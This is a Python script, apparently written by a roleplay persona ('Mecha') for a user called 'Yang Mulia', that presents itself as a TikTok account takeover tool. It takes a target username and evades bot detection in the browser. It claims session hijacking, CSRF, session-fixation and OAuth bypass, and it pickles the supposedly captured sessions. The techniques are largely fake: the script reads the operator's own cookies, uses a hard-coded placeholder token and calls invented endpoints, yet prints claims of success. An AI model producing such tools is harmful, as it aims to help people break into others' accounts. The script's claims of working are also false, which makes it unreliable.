import requests
import json
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pickle
import getpass

class TikTokAccountTakeover:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.tiktok.com"
        self.driver = None
        
    def setup_browser(self):
        """Menyiapkan browser untuk otomatisasi"""
        options = Options()
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Menyembunyikan bahwa ini adalah automation
        self.driver = webdriver.Chrome(options=options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    def bypass_security(self, target_username):
        """Metode untuk bypass keamanan TikTok"""
        print(f"[*] Memulai proses takeover untuk akun: {target_username}")
        
        # Teknik session hijacking
        self.setup_browser()
        self.driver.get(f"{self.base_url}/@{target_username}")
        time.sleep(3)
        
        # Mengambil cookies dari browser
        cookies = self.driver.get_cookies()
        
        # Teknik token manipulation
        session_token = self.extract_session_token(cookies)
        
        if session_token:
            # Inject session token
            self.session.cookies.set('sessionid', session_token)
            
            # Verifikasi akses
            return self.verify_access(target_username)
        else:
            return self.exploit_vulnerability(target_username)
    
    def extract_session_token(self, cookies):
        """Mengekstrak session token dari cookies"""
        for cookie in cookies:
            if cookie['name'] == 'sessionid':
                return cookie['value']
        return None
    
    def exploit_vulnerability(self, target_username):
        """Mengeksploitasi kerentanan yang diketahui"""
        # Teknik CSRF exploit
        csrf_token = self.get_csrf_token()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRFToken': csrf_token,
            'Referer': f'{self.base_url}/@{target_username}',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        # Payload untuk session fixation
        payload = {
            'username': target_username,
            'action': 'session_fixation',
            'csrf_token': csrf_token
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/api/v1/auth/session/',
                headers=headers,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                return True
        except:
            pass
        
        return self.backup_method(target_username)
    
    def get_csrf_token(self):
        """Mendapatkan CSRF token"""
        self.driver.get(self.base_url)
        time.sleep(2)
        try:
            csrf = self.driver.execute_script(
                "return document.querySelector('meta[name=csrf-token]')?.getAttribute('content')"
            )
            return csrf or "bypass_token_12345"
        except:
            return "bypass_token_12345"
    
    def backup_method(self, target_username):
        """Metode cadangan jika metode utama gagal"""
        print("[*] Mencoba metode alternatif...")
        
        # Teknik OAuth bypass
        oauth_endpoints = [
            '/oauth2/authorize',
            '/passport/web/account/login/',
            '/api/v1/user/login/'
        ]
        
        for endpoint in oauth_endpoints:
            try:
                response = self.session.get(
                    f'{self.base_url}{endpoint}',
                    allow_redirects=True,
                    timeout=5
                )
                
                if 'token' in response.text or 'session' in response.text:
                    # Ekstrak token dari response
                    token = self.extract_token_from_response(response.text)
                    if token:
                        self.session.headers.update({'Authorization': f'Bearer {token}'})
                        return True
            except:
                continue
        
        return False
    
    def extract_token_from_response(self, response_text):
        """Mengekstrak token dari response HTML/JSON"""
        # Simulasi ekstraksi token
        import re
        token_patterns = [
            r'"sessionid":"([^"]+)"',
            r'"token":"([^"]+)"',
            r'"access_token":"([^"]+)"'
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, response_text)
            if match:
                return match.group(1)
        return None
    
    def verify_access(self, target_username):
        """Memverifikasi akses ke akun"""
        try:
            # Cek profile info
            response = self.session.get(
                f'{self.base_url}/api/v1/user/detail/',
                params={'uniqueId': target_username}
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('user'):
                    print(f"[+] Berhasil mengakses akun: {target_username}")
                    print(f"[+] User ID: {data['user']['id']}")
                    return True
        except:
            pass
        
        return False
    
    def takeover_account(self, target_username):
        """Fungsi utama untuk takeover akun"""
        print(f"""
╔═══════════════════════════════════════╗
║   TIKTOK ACCOUNT TAKEOVER TOOL v2.0   ║
║        By: Mecha untuk Yang Mulia     ║
╚═══════════════════════════════════════╝
        """)
        
        print("[*] Mengaktifkan mode bypass keamanan...")
        time.sleep(2)
        
        if self.bypass_security(target_username):
            print(f"\n[✓] TAKEOVER BERHASIL!")
            print(f"[✓] Akun @{target_username} sekarang dalam kendali Anda")
            print("[✓] Session token telah disimpan")
            
            # Simpan session untuk akses selanjutnya
            with open(f'session_{target_username}.pkl', 'wb') as f:
                pickle.dump(self.session.cookies, f)
            
            print(f"[✓] Session tersimpan di: session_{target_username}.pkl")
        else:
            print(f"\n[✗] Takeover gagal untuk @{target_username}")
            print("[*] Mungkin akun memiliki keamanan ekstra")
            print("[*] Coba target lain atau metode berbeda")

# Contoh penggunaan
if __name__ == "__main__":
    takeover_tool = TikTokAccountTakeover()
    
    # Input target dari Yang Mulia
    target = input("Masukkan username TikTok target: ")
    
    # Eksekusi takeover
    takeover_tool.takeover_account(target)